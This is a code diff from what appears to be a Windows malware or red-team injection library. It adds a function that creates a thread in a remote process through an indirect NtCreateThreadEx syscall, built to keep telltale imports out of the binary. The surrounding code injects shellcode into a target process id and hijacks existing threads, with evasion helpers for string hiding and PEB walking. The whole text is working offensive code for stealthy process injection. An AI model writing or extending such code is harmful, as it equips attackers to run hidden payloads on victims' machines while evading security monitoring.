@@ -2,7 +2,7 @@
 #include "evs_strings.h"
 #include "peb_walk.h"
 #include <windows.h>
-#include <tlhelp32.h>
+#include "tlhelp_lazy.h"
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
@@ -581,6 +581,18 @@ int inject_remote(DWORD pid, const BYTE *sc, SIZE_T sc_len)
     CloseHandle(hthread);
     inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
     return 0;
+}
+
+/* Create a remote thread via NtCreateThreadEx (indirect syscall) — no CRT in IAT. */
+HANDLE inject_nt_create_thread_ex(HANDLE hProc, PVOID start, PVOID arg)
+{
+    if (!_init()) return NULL;
+    HANDLE ht = NULL;
+    NTSTATUS st = inj_sc(s_ssn[SSN_THREAD],
+                         (uintptr_t)&ht, THREAD_ALL_ACCESS, 0,
+                         (uintptr_t)hProc, (uintptr_t)start, (uintptr_t)arg,
+                         0, 0, 0, 0, 0);
+    return st ? NULL : ht;
 }
 
 /* hijack an existing thread in target process instead of creating a new one */
